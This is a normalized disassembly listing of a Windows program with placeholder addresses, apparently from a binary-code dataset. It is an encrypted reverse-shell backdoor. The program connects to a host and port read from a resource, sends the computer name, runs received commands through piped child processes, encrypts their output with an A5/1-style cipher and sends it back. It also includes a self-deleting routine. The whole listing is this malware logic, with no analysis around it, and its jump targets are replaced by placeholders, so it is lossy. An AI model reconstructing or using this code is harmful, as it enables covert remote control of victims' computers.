sub_401000
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0x9
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x3
xor ecx eax
and eax 0x3ffff
shr ecx 0xd
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_401040
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0xb
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x4
xor ecx eax
shr ecx 0x4
xor ecx eax
and eax 0x1fffff
shr ecx 0xc
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_401080
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov ecx eax
shr ecx 0xb
and ecx 0x1
xor ecx edx
je r-xdata
retn
mov ecx eax
shr ecx 0x1
xor ecx eax
shr ecx 0x3
xor ecx eax
shr ecx 0x1
xor ecx eax
and eax 0x3fffff
shr ecx 0x11
shl eax 0x1
test cl 0x1
je r-xdata
xor eax 0x1
sub_4010c0
mov eax [ esp + 0x8 ]
push ebx
push esi
movsx edx [ eax ]
movsx ecx [ eax + 0x1 ]
shl edx 0x8
or edx ecx
mov cl [ eax + 0x2 ]
sar cl 0x5
movsx ecx cl
shl edx 0x3
or edx ecx
mov ecx [ esp + 0xc ]
mov [ ecx ] edx
mov bl [ eax + 0x5 ]
movsx edx [ eax + 0x2 ]
movsx esi [ eax + 0x3 ]
shl edx 0x6
or edx esi
movsx esi [ eax + 0x4 ]
shl edx 0x8
sar bl 0x7
or edx esi
movsx esi bl
shl edx 0x1
or edx esi
mov [ ecx + 0x4 ] edx
movsx edx [ eax + 0x5 ]
movsx esi [ eax + 0x6 ]
movsx eax [ eax + 0x7 ]
shl edx 0x9
or edx esi
pop esi
shl edx 0x8
or edx eax
pop ebx
mov [ ecx + 0x8 ] edx
retn
sub_401130
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push eax
push ecx
push edx
call sub_401190
mov edi eax
mov eax [ esi ]
push eax
push edi
call sub_401000
mov ecx [ esi + 0x4 ]
mov [ esi ] eax
push ecx
push edi
call sub_401040
mov edx [ esi + 0x8 ]
mov [ esi + 0x4 ] eax
push edx
push edi
call sub_401080
mov edi [ esi ]
mov ecx eax
mov eax [ esi + 0x4 ]
add esp 0x24
xor eax edi
mov [ esi + 0x8 ] ecx
xor eax ecx
pop edi
and eax 0x1
pop esi
retn
sub_401190
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
and al 0x80
xor ecx ecx
cmp al 0x80
sete cl
and edx 0x800
xor eax eax
cmp edx 0x800
mov edx [ esp + 0xc ]
sete al
add ecx eax
and edx 0x800
xor eax eax
cmp edx 0x800
sete al
add ecx eax
xor eax eax
cmp ecx 0x1
setle al
retn
sub_4011e0
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
xor esi esi
mov bl 0x1
test ebp ebp
jle r-xdata
pop esi
pop ebp
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
push eax
call sub_401130
mov dl [ esi + edi ]
add esp 0x4
shl bl 0x1
or bl al
xor dl bl
mov [ esi + edi ] dl
inc esi
cmp esi ebp
jl r-xdata
pop edi
sub_401270
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
test ebp ebp
push edi
mov esi ebp
jle r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
mov ebx [ esp + 0x14 ]
mov edi [ esp + 0x18 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
je r-xdata
mov eax ebp
pop edi
sub eax esi
pop esi
pop ebp
pop ebx
retn
sub esi eax
add edi eax
test esi esi
jg r-xdata
push 0x0
push esi
push edi
push ebx
call send
test eax eax
jl r-xdata
sub_4012c0
push esi
mov esi [ CreateEventA@IAT ]
push edi
push 0x0
push 0x0
push 0x1
push 0x0
call esi
push 0x0
push 0x0
push 0x1
push 0x0
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
mov ecx 0x4b
xor eax eax
mov edi rw-data
[ edi ]
mov eax [ esp + 0xc ]
push eax
call sub_401320
mov ecx [ rw-data ]
add esp 0x4
push 0x0
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
pop edi
pop esi
retn
sub_401320
sub esp 0x3dc
push ebp
push esi
push edi
push 0x3a
push rw-data
call strchr
mov edx eax
add esp 0x8
sub edx rw-data
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
add esp 0x3dc
retn
xor eax eax
test edx edx
jle r-xdata
mov [ esp + eax + 0x40 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
not ecx
dec ecx
sub ecx edx
test ecx ecx
jle r-xdata
mov ecx edx
mov esi rw-data
mov eax ecx
lea edi [ esp + 0x40 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea edx [ esp + 0xc ]
lea eax [ esp + 0x154 ]
push edx
push eax
mov [ esp + esi + 0x34 ] 0x0
mov [ esp + 0x14 ] 0x104
call [ GetComputerNameA@IAT ]
lea ecx [ esp + 0x258 ]
push ecx
push 0x101
call WSAStartup
push 0x0
push 0x1
push 0x2
call socket
mov ebp eax
cmp ebp 0xffffffff
jne r-xdata
mov cl [ edx + esi + rw-data ]
mov edi rw-data
mov [ esp + esi + 0x2c ] cl
or ecx 0xffffffff
xor eax eax
inc esi
[ edi ]
not ecx
dec ecx
sub ecx edx
cmp esi ecx
jl r-xdata
lea edx [ esp + 0x2c ]
mov [ esp + 0x10 ] 0x2
push edx
call atol
add esp 0x4
push eax
call htons
mov [ esp + 0x12 ] ax
lea eax [ esp + 0x40 ]
push eax
call inet_addr
lea ecx [ esp + 0x10 ]
push 0x10
push ecx
push ebp
mov [ esp + 0x20 ] eax
call connect
cmp eax 0xffffffff
jne r-xdata
push eax
call closesocket
push 0x927c0
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x54 ]
lea edx [ esp + 0x54 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x54 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0x158 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x58 ]
mov [ esp + ecx + 0x57 ] al
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x58 ]
push ecx
push eax
push ebp
call send
mov esi eax
lea edi [ esp + 0x54 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call sprintf
push esi
lea edx [ esp + 0x30 ]
push rw-data
push edx
call sprintf
add esp 0x18
cmp esi 0xffffffff
je r-xdata
push ebp
call closesocket
push 0x3e8
jmp r-xdata
call sub_401b20
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x54 ]
push 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x58 ]
push 0xff
push eax
push ebp
call recv
cmp eax 0xffffffff
je r-xdata
call [ Sleep@IAT ]
test eax eax
jle r-xdata
push 0x6
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call _strnicmp
add esp 0xc
test eax eax
jne r-xdata
push 0x0
call [ ExitThread@IAT ]
push 0xa
lea edx [ esp + 0x58 ]
push rw-data
push edx
call _strnicmp
add esp 0xc
test eax eax
je r-xdata
push ebp
push 0x0
push sub_4016c0
call _beginthread
add esp 0xc
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x54 ]
push 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ esp + 0x58 ]
push 0xff
push eax
push ebp
call recv
cmp eax 0xffffffff
jne r-xdata
call sub_401b20
pop edi
pop esi
pop ebp
add esp 0x3dc
retn
sub_4015d0
sub esp 0x14
push ebx
push esi
push edi
push 0x18
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] 0x0
call malloc
mov ebx [ CreatePipe@IAT ]
add esp 0x4
mov esi eax
lea eax [ esp + 0x14 ]
push 0x0
lea ecx [ esp + 0x14 ]
lea edi [ esi + 0x4 ]
push eax
push ecx
mov [ esi ] 0x0
mov [ edi ] 0x0
push esi
mov [ esp + 0x24 ] 0xc
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x1
call ebx
test eax eax
je r-xdata
mov eax [ esi ]
mov ebx [ CloseHandle@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x14 ]
push 0x0
push edx
lea eax [ esp + 0x14 ]
push edi
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push eax
call ebx
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
push edx
call sub_401830
mov edi [ CloseHandle@IAT ]
add esp 0x8
mov [ esi + 0x8 ] eax
mov eax [ esp + 0xc ]
push eax
call edi
mov ecx [ esp + 0x10 ]
push ecx
call edi
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x14
retn
mov edi [ edi ]
test edi edi
je r-xdata
push eax
call ebx
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push edi
call ebx
push esi
call free
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebx
add esp 0x14
retn
push eax
call ebx
sub_4016c0
sub esp 0x1c
push esi
push edi
push 0x18
call malloc
add esp 0x4
call sub_4015d0
mov edi [ CreateThread@IAT ]
lea ecx [ esp + 0x8 ]
mov esi eax
mov eax [ esp + 0x28 ]
push ecx
push 0x0
push esi
push sub_401910
lea edx [ esp + 0x1c ]
push 0x0
mov [ esp + 0x20 ] 0xc
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x28 ] 0x0
push edx
mov [ esi + 0xc ] eax
call edi
test eax eax
mov [ esi + 0x10 ] eax
jne r-xdata
lea eax [ esp + 0x8 ]
lea ecx [ esp + 0xc ]
push eax
push 0x0
push esi
push r-xdata
push 0x0
push ecx
call edi
test eax eax
mov [ esi + 0x14 ] eax
jne r-xdata
mov [ esi + 0xc ] 0xffffffff
pop edi
pop esi
add esp 0x1c
retn
mov edx [ esi + 0x10 ]
push 0xffffffff
mov [ esp + 0x1c ] edx
mov eax [ esi + 0x14 ]
lea edx [ esp + 0x1c ]
mov [ esp + 0x20 ] eax
mov ecx [ esi + 0x8 ]
push 0x0
push edx
push 0x3
mov [ esp + 0x30 ] ecx
call [ WaitForMultipleObjects@IAT ]
sub eax 0x0
je r-xdata
push eax
push eax
mov [ esi + 0xc ] 0xffffffff
call [ TerminateThread@IAT ]
pop edi
pop esi
add esp 0x1c
retn
mov ecx [ esi + 0x14 ]
push 0x0
push ecx
call [ TerminateThread@IAT ]
mov edx [ esi + 0x8 ]
push 0x1
push edx
dec eax
je r-xdata
call sub_401b20
pop edi
pop esi
add esp 0x1c
retn
push esi
call free
add esp 0x4
mov edx [ esi + 0x10 ]
push 0x0
push edx
call [ TerminateThread@IAT ]
mov eax [ esi + 0x8 ]
push 0x1
push eax
jmp r-xdata
dec eax
jne r-xdata
call [ TerminateProcess@IAT ]
mov eax [ esi + 0xc ]
push ebx
push eax
call closesocket
mov ecx [ esi ]
mov ebx [ DisconnectNamedPipe@IAT ]
push ecx
call ebx
mov edx [ esi ]
mov edi [ CloseHandle@IAT ]
push edx
call edi
mov eax [ esi + 0x4 ]
push eax
call ebx
mov ecx [ esi + 0x4 ]
push ecx
call edi
mov edx [ esi + 0x10 ]
push edx
call edi
mov eax [ esi + 0x14 ]
push eax
call edi
mov ecx [ esi + 0x8 ]
push ecx
call edi
test esi esi
pop ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov edi [ TerminateThread@IAT ]
push 0x0
push eax
call edi
mov ecx [ esi + 0x10 ]
push 0x0
push ecx
call edi
jmp r-xdata
sub_401830
sub esp 0x60
mov eax [ esp + 0x64 ]
push ebx
push esi
mov esi [ esp + 0x70 ]
xor ebx ebx
push edi
mov edi [ GetCurrentProcess@IAT ]
push ebx
push 0x1
lea ecx [ esp + 0x70 ]
push 0x2
push ecx
mov [ esp + 0x38 ] 0x44
mov [ esp + 0x3c ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x68 ] bx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x6a ] bx
mov [ esp + 0x64 ] 0x101
mov [ esp + 0x70 ] eax
mov [ esp + 0x74 ] esi
mov [ esp + 0x78 ] esi
call edi
push eax
push esi
call edi
push eax
call [ DuplicateHandle@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x28 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0xc ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
push edx
push ebx
push ebx
push ebx
push 0x1
push ebx
push ebx
push eax
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
pop edi
mov eax ebx
pop esi
pop ebx
add esp 0x60
retn
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x18 ]
push ecx
call [ CloseHandle@IAT ]
mov eax esi
pop edi
pop esi
pop ebx
add esp 0x60
retn
sub_401910
sub esp 0x414
push ebp
push esi
push edi
push 0x18
call malloc
mov esi [ esp + 0x428 ]
mov ebp eax
add esp 0x4
mov ecx 0x6
mov edi ebp
lea eax [ esp + 0xc ]
[ edi ] [ esi ]
mov edx [ ebp ]
mov edi [ PeekNamedPipe@IAT ]
push 0x0
push 0x0
push eax
lea ecx [ esp + 0x2c ]
push 0x400
push ecx
push edx
call edi
test eax eax
je r-xdata
push ebp
call free
add esp 0x4
push 0x0
call [ ExitThread@IAT ]
mov esi [ ReadFile@IAT ]
push 0x32
call [ Sleep@IAT ]
mov edx [ ebp ]
lea eax [ esp + 0xc ]
push 0x0
push eax
lea ecx [ esp + 0x28 ]
push 0x400
push ecx
push edx
call esi
mov eax [ esp + 0xc ]
push rw-data
mov [ esp + eax + 0x24 ] 0x0
inc eax
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x18 ]
push eax
call sub_4010c0
mov ecx [ esp + 0x14 ]
lea edx [ esp + 0x28 ]
push ecx
lea eax [ esp + 0x20 ]
push edx
push eax
call sub_4011e0
mov edx [ esp + 0x20 ]
add esp 0x14
lea ecx [ esp + 0x10 ]
push 0x0
push 0x4
push 0xa
push ecx
push edx
call _itoa
add esp 0xc
push eax
mov eax [ ebp + 0xc ]
push eax
call send
test eax eax
jle r-xdata
mov eax [ esp + 0xc ]
test eax eax
jbe r-xdata
mov ecx [ esp + 0xc ]
mov eax [ ebp + 0xc ]
lea edx [ esp + 0x20 ]
push ecx
push edx
push eax
call sub_401270
add esp 0xc
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp ]
push 0x0
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
lea edx [ esp + 0x2c ]
push 0x400
push edx
push eax
call edi
test eax eax
jne r-xdata
sub_401b20
sub esp 0x348
lea eax [ esp + 0x3c ]
push ebx
push ebp
push esi
push edi
push 0x104
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x348
retn
lea ecx [ esp + 0x4c ]
push 0x104
lea edx [ esp + 0x50 ]
push ecx
push edx
call [ GetShortPathNameA@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x254 ]
push 0x104
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea edx [ esp + 0x4c ]
lea eax [ esp + 0x150 ]
push edx
push eax
call esi
lea ecx [ esp + 0x150 ]
push rw-data
push ecx
call esi
mov [ esp + 0x18 ] edi
lea edx [ esp + 0x254 ]
lea eax [ esp + 0x150 ]
mov [ esp + 0x28 ] edi
mov [ esp + 0x2c ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ esp + 0x14 ] 0x3c
mov [ esp + 0x20 ] rw-data
mov [ esp + 0x24 ] edx
mov [ esp + 0x28 ] eax
mov [ esp + 0x18 ] 0x40
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
mov ebp [ SetThreadPriority@IAT ]
push eax
call ebp
lea ecx [ esp + 0x10 ]
push ecx
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call ebp
mov edx [ esp + 0x48 ]
push 0x40
push edx
call esi
mov eax [ esp + 0x48 ]
push 0x1
push eax
call [ SetProcessPriorityBoost@IAT ]
lea ecx [ esp + 0x4c ]
push 0x0
push ecx
push 0x1
push 0x4
call [ SHChangeNotify@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x348
retn
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_401e29
cmp [ rw-data ] ebx
jne r-xdata
call sub_401e14
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_401e26
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401240
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401220
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push eax
push ecx
push edx
call sub_4011e0
add esp 0xc
retn
sub_401240
mov eax [ esp + 0x4 ]
push 0xff
push rw-data
push 0x1
push eax
call [ LoadStringA@IAT ]
push rw-data
call sub_4012c0
add esp 0x4
xor eax eax
retn 0x10
_beginthread
jmp [ _beginthread@IAT ]
_strnicmp
jmp [ _strnicmp@IAT ]
sprintf
jmp [ sprintf@IAT ]
atol
jmp [ atol@IAT ]
strchr
jmp [ strchr@IAT ]
free
jmp [ free@IAT ]
malloc
jmp [ malloc@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_401e14
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_401e26
xor eax eax
retn
sub_401e29
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
send
jmp [ send@IAT ]
recv
jmp [ recv@IAT ]
connect
jmp [ connect@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
htons
jmp [ htons@IAT ]
closesocket
jmp [ closesocket@IAT ]
socket
jmp [ socket@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
_itoa
jmp [ _itoa@IAT ]
